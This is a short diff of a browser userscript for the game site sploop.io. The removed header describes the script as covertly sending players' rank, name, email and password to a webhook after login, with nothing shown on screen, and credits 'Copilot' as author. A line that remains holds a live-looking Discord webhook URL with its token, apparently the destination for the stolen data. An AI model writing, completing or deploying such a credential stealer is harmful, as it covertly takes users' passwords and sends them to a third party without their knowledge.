@@ -1,12 +1,4 @@
-// ==UserScript==
-// @name         Sploop Account Info to Webhookdalemaodal)
-// @version      1.1.0
-// @description  Sends Sploop account info (rank, name, email, password) to a webhook after successful login. No details are shown on screen.
-// @author       Copilot
-// @match        *://sploop.io/*
-// @require      https://update.greasyfork.org/scripts/130/10066/Portable%20MD5%20Function.js
-// @grant        none
-// ==/UserScript==
+
 
 // Usage
 const realWebhookUrl = "https://discord.com/api/webhooks/1393508473077108787/IkEl2k88mLBvpz03PpkRMCOp6XnXgCTLQsbOdtQLyz0eJkbkf5_XcR0ie0b-dqU00e9c";
